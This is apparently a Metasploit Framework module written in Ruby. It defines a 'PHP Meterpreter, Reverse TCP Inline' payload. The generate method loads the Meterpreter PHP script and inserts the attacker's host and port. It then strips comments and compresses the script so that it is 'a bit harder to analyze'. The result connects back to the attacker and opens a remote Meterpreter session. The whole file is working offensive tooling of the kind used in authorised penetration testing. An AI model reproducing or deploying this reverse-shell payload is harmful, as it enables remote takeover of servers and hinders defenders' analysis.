##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_php'
require 'msf/base/sessions/meterpreter_options'


module Metasploit3

  CachedSize = 24643

  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'PHP Meterpreter, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a Meterpreter server (PHP)',
      'Author'        => ['egypt'],
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'License'       => MSF_LICENSE,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::Meterpreter_Php_Php))
  end

  def generate
    file = File.join(Msf::Config.data_directory, "meterpreter", "meterpreter.php")
    met = File.open(file, "rb") {|f|
      f.read(f.stat.size)
    }
    met.gsub!("127.0.0.1", datastore['LHOST']) if datastore['LHOST']
    met.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']

    # remove comments and compress whitespace to make it smaller and a
    # bit harder to analyze
    met.gsub!(/#.*$/, '')
    met = Rex::Text.compress(met)
    met
  end
end
